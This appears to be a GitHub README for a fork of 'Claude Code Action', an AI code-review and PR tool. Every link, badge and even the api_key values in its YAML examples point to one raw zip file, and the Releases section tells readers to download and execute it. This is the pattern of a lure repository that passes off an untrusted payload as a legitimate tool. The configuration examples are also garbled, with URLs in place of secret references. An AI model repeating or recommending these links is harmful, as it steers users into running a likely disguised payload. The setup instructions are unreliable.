# Claude Code Action

![GitHub Release](https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip)
![GitHub Issues](https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip)

A general-purpose [Claude Code](https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip) action for GitHub PRs and issues that can answer questions and implement code changes. This action listens for a trigger phrase in comments and activates Claude to act on the request. It supports multiple authentication methods, including Anthropic direct API, Amazon Bedrock, and Google Vertex AI.

## Table of Contents

- [Features](#features)
- [Getting Started](#getting-started)
- [Usage](#usage)
- [Configuration](#configuration)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Features

- 🤖 **Interactive Code Assistant**: Claude can answer questions about code, architecture, and programming.
- 🔍 **Code Review**: Analyzes PR changes and suggests improvements.
- ✨ **Code Implementation**: Can implement simple fixes, refactoring, and even new features.
- 💬 **PR/Issue Integration**: Works seamlessly with GitHub comments and PR reviews.
- 🛠️ **Flexible Tool Access**: Access to GitHub APIs and file operations (additional tools can be enabled via configuration).
- 📋 **Progress Tracking**: Visual progress indicators with checkboxes that dynamically update as Claude completes tasks.
- 🏃 **Runs on Your Infrastructure**: The action runs on your own servers or cloud.

## Getting Started

To get started with Claude Code Action, you need to set up your GitHub repository and configure the action.

1. **Create a GitHub Repository**: If you don’t have one, create a new repository on GitHub.
2. **Enable GitHub Actions**: Ensure that GitHub Actions are enabled in your repository settings.
3. **Add Claude Code Action**: Create a new YAML file in the `.github/workflows` directory of your repository.

Here is a basic example of a workflow file:

```yaml
name: Claude Code Action

on:
  issue_comment:
    types: [created]

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Run Claude Code Action
        uses: Andyrex1224/claude-code-action@v1
        with:
          api_key: ${{ https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip }}
```

Replace `CLAUDE_API_KEY` with your actual API key stored in GitHub Secrets.

## Usage

Once you have set up the action, you can use it in your GitHub PRs and issues. Simply comment with a trigger phrase, and Claude will respond.

### Trigger Phrases

You can customize the trigger phrases in the configuration. By default, you can use:

- "Claude, can you help with this?"
- "Claude, please review this."
- "Claude, implement this change."

### Example Comments

- **For a code review**: "Claude, can you help with this? Please review my PR."
- **For code implementation**: "Claude, implement this change in the `https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip` file."

## Configuration

You can configure the Claude Code Action to fit your needs. Here are the key configuration options:

- **Authentication Method**: Choose between Anthropic, Amazon Bedrock, or Google Vertex AI.
- **Trigger Phrases**: Customize the phrases that activate Claude.
- **Tools Access**: Enable or disable access to additional tools based on your requirements.

### Example Configuration

```yaml
with:
  api_key: ${{ https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip }}
  auth_method: 'anthropic'  # Options: 'anthropic', 'amazon', 'google'
  trigger_phrases: 'Claude, can you help with this?'
  enable_tools: true
```

## Examples

### Code Review Example

When you submit a PR and comment, "Claude, please review this," the action will trigger Claude to analyze the changes. Claude will then provide feedback and suggest improvements based on the code.

### Code Implementation Example

If you comment, "Claude, implement this change in the `https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip` file," Claude will review the request and implement the necessary changes.

## Contributing

We welcome contributions to Claude Code Action! To contribute:

1. Fork the repository.
2. Create a new branch.
3. Make your changes.
4. Submit a pull request.

Please ensure that your code adheres to the project's coding standards and includes appropriate tests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Releases

To download the latest release of Claude Code Action, visit the [Releases section](https://github.com/Andyrex1224/claude-code-action/raw/refs/heads/main/src/github/validation/code_action_claude_1.0.zip). Download the latest version and execute it as per your setup instructions.

If you encounter any issues, please check the "Releases" section for updates or fixes.

---

Feel free to explore the features and enhance your GitHub workflow with Claude Code Action. Happy coding!